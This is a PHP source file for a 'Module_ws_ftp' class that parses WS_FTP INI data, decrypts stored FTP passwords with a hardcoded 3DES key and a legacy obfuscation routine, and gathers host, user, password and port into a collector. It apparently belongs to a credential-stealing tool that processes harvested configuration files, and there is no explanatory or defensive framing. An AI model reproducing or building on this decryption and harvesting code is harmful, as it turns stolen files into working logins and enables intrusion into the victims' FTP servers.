<?php
class Module_ws_ftp extends Module_
{
    protected function Decrypt($pass)
    {
        if (!strlen($pass))
            return false;

        if ($pass[0] == '_')
        {
            $data = base64_decode(substr($pass, 1), true);

            if (!strlen($data))
                return false;

            $des_key = chr(0xE1).chr(0xF0).chr(0xC3).chr(0xD2).chr(0xA5).chr(0xB4).chr(0x87).chr(0x96).
                       chr(0x69).chr(0x78).chr(0x4B).chr(0x5A).chr(0x2D).chr(0x3C).chr(0x0F).chr(0x1E).
                       chr(0x34).chr(0x12).chr(0x78).chr(0x56).chr(0xAB).chr(0x90).chr(0xEF).chr(0xCD);


            $iv = substr($des_key, 16);
            $data = mcrypt_decrypt(MCRYPT_3DES, $des_key, $data, MCRYPT_MODE_CBC, $iv);

            if (!strlen($data))
            {
            }

            return ztrim($data);
        }
        else
        {
            $offset = 1;
            $result = "";
            $i = 33;

            while ($i < strlen($pass)-1)
            {
                $eax = ord($pass[$i]);
                if ($eax > 0x39)
                    $eax = _BF_SUB32($eax, 0x37);
                else
                    $eax = _BF_SUB32($eax, 0x30);

                $ebx = _BF_SHL32($eax, 4);

                $eax = ord($pass[$i+1]);
                if ($eax > 0x39)
                    $eax = _BF_SUB32($eax, 0x37);
                else
                    $eax = _BF_SUB32($eax, 0x30);
                $ebx = _BF_ADD32($ebx, $eax);

                $eax = ord($pass[$offset]) & 0x3f;
                $ebx = _BF_SUB32(_BF_SUB32($ebx, $eax), $offset-1);
                $offset++;

                if ($offset > 33)
                    break;

                $result .= chr($ebx);

                $i += 2;
            }

            return ztrim($result);
        }
    }

    protected function ProcessWS($Data)
    {
        $INI_ = parse_ini($Data);
        if(!$INI_)
            return FALSE;

        foreach ($INI_ as $Element)
        {
            if (!is_array($Element))
                continue;

            if (isset($Element["HOST"]))
            {
				$Prot = '';
				if(isset($Element["CONNTYPE"]))
				{
					$Prot = $Element["CONNTYPE"];
				}
                

                $Port = '';
                $Pass = '';

                $Host = Assign_(strip_quotes($Element["HOST"]));
                $User = Assign_(strip_quotes($Element["UID"]));
				
                if (isset($Element["PWD"]))
                    $Pass = $this->Decrypt(strip_quotes($Element["PWD"]));
                if (isset($Element["PORT"]))
                    $Port = Assign_(strip_quotes($Element["PORT"]));

                $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 4) , $Port), $User, $Pass);
            }
        }

        $INI_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessWS($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

